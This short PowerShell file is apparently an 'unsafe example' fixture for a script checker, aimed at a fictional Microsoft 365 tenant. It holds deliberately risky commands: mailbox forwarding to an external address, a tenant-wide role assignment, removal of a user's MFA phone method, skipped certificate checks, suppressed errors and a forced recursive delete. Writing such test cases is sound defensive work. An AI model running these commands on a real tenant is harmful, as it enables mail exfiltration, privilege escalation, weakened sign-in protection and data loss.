# UNSAFE EXAMPLE for the checker. Fictional tenant (Fernwood Services). Do not run.
Connect-AzureAD
Connect-MgGraph -Scopes "RoleManagement.ReadWrite.Directory" -NoWelcome
Set-Mailbox -Identity "a.sample@fernwood.example" -ForwardingSmtpAddress "archive@mail.example"
New-MgRoleManagementDirectoryRoleAssignment -PrincipalId $userId -RoleDefinitionId $roleId -DirectoryScopeId "/"
Remove-MgUserAuthenticationPhoneMethod -UserId $userId -PhoneAuthenticationMethodId $methodId
$policy = @{ displayName = "Block legacy sign-in"; state = "enabled" }
Invoke-MgGraphRequest -Method POST -Uri "https://graph.microsoft.com/v1.0/identity/conditionalAccess/policies" -Body $policy -ErrorAction SilentlyContinue
Invoke-RestMethod -Uri "https://api.fernwood.example/health" -SkipCertificateCheck
Remove-Item -Path "$exportRoot\*" -Recurse -Force
